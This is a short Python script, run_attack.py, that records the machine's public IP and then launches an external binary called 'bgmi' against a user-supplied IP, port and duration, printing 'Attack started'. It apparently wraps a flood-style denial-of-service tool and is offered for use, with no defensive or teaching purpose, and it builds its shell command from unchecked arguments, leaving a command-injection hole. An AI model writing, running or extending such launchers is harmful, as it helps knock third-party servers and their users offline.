import sys
import subprocess
import requests
import json
import os

# Constants
IP_FILE = 'current_ip.json'

def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        response.raise_for_status()
        ip_data = response.json()
        return ip_data['ip']
    except requests.RequestException as e:
        print(f"Error fetching public IP: {e}")
        return None

def update_ip_file(ip):
    with open(IP_FILE, 'w') as f:
        json.dump({'ip': ip}, f)

def get_stored_ip():
    if not os.path.exists(IP_FILE):
        return None
    
    with open(IP_FILE, 'r') as f:
        ip_data = json.load(f)
        return ip_data.get('ip')

def run_attack(ip, port, time):
    # Assuming the attack binary is named `bgmi` and takes arguments as specified
    command = f"./bgmi {ip} {port} {time} 200"
    try:
        subprocess.run(command, shell=True, check=True)
        print(f"Attack started on IP {ip}, Port {port}, Time {time}")
    except subprocess.CalledProcessError as e:
        print(f"Error running attack: {e}")

def main():
    if len(sys.argv) != 4:
        print("Usage: python run_attack.py <ip> <port> <time>")
        sys.exit(1)
    
    # Read command-line arguments
    ip = sys.argv[1]
    port = int(sys.argv[2])
    time = int(sys.argv[3])

    # Check if the public IP has changed and update if necessary
    stored_ip = get_stored_ip()
    current_ip = get_public_ip()

    if current_ip != stored_ip:
        print(f"Public IP changed from {stored_ip} to {current_ip}")
        update_ip_file(current_ip)
    
    # Run the attack with the specified parameters
    run_attack(ip, port, time)

if __name__ == "__main__":
    main()
